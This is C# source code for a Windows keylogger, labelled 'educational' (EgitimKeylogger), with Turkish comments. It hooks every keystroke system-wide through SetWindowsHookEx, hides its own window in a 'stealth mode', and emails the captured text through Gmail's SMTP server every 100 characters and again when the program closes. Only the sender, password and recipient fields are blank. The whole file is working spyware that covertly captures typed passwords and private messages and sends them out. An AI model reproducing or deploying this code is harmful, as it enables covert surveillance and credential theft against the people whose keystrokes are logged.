using System;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.IO;

namespace EgitimKeylogger
{
    public partial class Form1 : Form
    {
        // --- PROJE AYARLARI ---
        // GÖRÜNÜRLÜK AYARI
        const bool GIZLI_MOD = true;

        // --- WINDOWS API FONKSİYONLARI (P/Invoke) ---
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // Farklı klavye dillerindeki karakterleri doğru yakalamak için gereken API fonksiyonları.
        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder pwszBuff, int cchBuff, uint wFlags);


        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr _hookID = IntPtr.Zero;

        // --- PROGRAM DEĞİŞKENLERİ ---
        private static Form1 _mainForm;
        private LowLevelKeyboardProc _proc;
        private StringBuilder _logBuilder = new StringBuilder();

        public Form1()
        {
            InitializeComponent();
            _proc = HookCallback;
        }

        // FORM YÜKLENİNCE: Program ilk çalıştığında bu fonksiyon tetiklenir.
        private void Form1_Load(object sender, EventArgs e)
        {
            _mainForm = this;
            _hookID = SetHook(_proc); // Klavye dinleyiciyi (hook) başlat.
            UpdateStatus("Klavye dinleniyor...");

            // Eğer GIZLI_MOD aktif ise formu gizle.
            if (GIZLI_MOD)
            {
                this.Opacity = 0;
                this.ShowInTaskbar = false;
            }
        }

        // FORM KAPATILIRKEN: Program kapatıldığında son bir kez logları gönder ve dinleyiciyi kaldır.
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_logBuilder.Length > 0)
            {
                SendEmail();
            }
            UnhookWindowsHookEx(_hookID);
        }

        private void UpdateStatus(string message)
        {
            string fullMessage = $"Durum ({DateTime.Now:HH:mm:ss}): {message}";

            if (statusStrip1.InvokeRequired)
            {
                statusStrip1.Invoke(new Action(() => { lblStatus.Text = fullMessage; }));
            }
            else
            {
                lblStatus.Text = fullMessage;
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        // TUŞ YAKALAMA FONKSİYONU: Her tuşa basıldığında Windows bu fonksiyonu çağırır.
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                // Türkçe karakter sorununu çözer.
                StringBuilder buffer = new StringBuilder(256);
                byte[] keyboardState = new byte[256];
                GetKeyboardState(keyboardState);

                string loggedKey;
                if (ToUnicode((uint)vkCode, 0, keyboardState, buffer, buffer.Capacity, 0) > 0)
                {
                    // Eğer tuş bir karaktere dönüşebiliyorsa (a, b, i, ş, 1, +, ? gibi)
                    loggedKey = buffer.ToString();
                }
                else
                {
                    // Eğer tuş bir karakter değilse (Enter, Shift, F5 gibi), ismini yaz.
                    Keys key = (Keys)vkCode;
                    loggedKey = $" [{key}] ";
                }

                // Enter tuşuna basıldığında yeni satıra geç.
                if ((Keys)vkCode == Keys.Enter)
                {
                    loggedKey = "\n";
                }

                _mainForm.Invoke(new Action(() => {
                    _mainForm._logBuilder.Append(loggedKey);

                    if (!GIZLI_MOD)
                    {
                        _mainForm.txtLogContent.AppendText(loggedKey);
                        _mainForm.lblCharCount.Text = $"Karakter: {_mainForm._logBuilder.Length}";
                    }
                }));

                // Her 100 karakterde bir e-posta gönder.
                if (_mainForm._logBuilder.Length > 100)
                {
                    _mainForm.Invoke(new Action(() => { _mainForm.SendEmail(); }));
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // E-POSTA GÖNDERME FONKSİYONU: Biriktirilen logları mail olarak yollar.
        private void SendEmail()
        {
            if (_logBuilder.Length == 0) return;

            UpdateStatus("E-posta gönderiliyor...");
            if (!GIZLI_MOD) Application.DoEvents();

            string logToSend = _logBuilder.ToString();

            try
            {
                // E-posta gönderici ve alıcı bilgileri.
                string fromMail = "";
                string fromPassword = ""; // Google Uygulama Şifresi
                string toMail = "";

                // SMTP istemcisini Gmail için yapılandır.
                SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    Credentials = new NetworkCredential(fromMail, fromPassword),
                    EnableSsl = true,
                };

                // E-posta mesajını oluştur ve gönder.
                MailMessage mailMessage = new MailMessage(fromMail, toMail, "Klavye Girdi Logları", logToSend);
                smtpClient.Send(mailMessage);

                // Gönderim başarılıysa logları ve arayüzü temizle.
                _logBuilder.Clear();
                if (!GIZLI_MOD)
                {
                    txtLogContent.Clear();
                    lblCharCount.Text = "Karakter: 0";
                }
                UpdateStatus("E-posta başarıyla gönderildi!");
            }
            catch (Exception ex)
            {
                // Hata durumunda hem ekrana uyarı ver hem de dosyaya logla.
                if (!GIZLI_MOD)
                {
                    MessageBox.Show(ex.ToString(), "E-posta Gönderim Hatası", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                UpdateStatus($"HATA! Detaylar için error_log.txt dosyasına bakın.");
                File.AppendAllText("error_log.txt", $"{DateTime.Now}: {ex}\n\n");
            }
        }
    }
}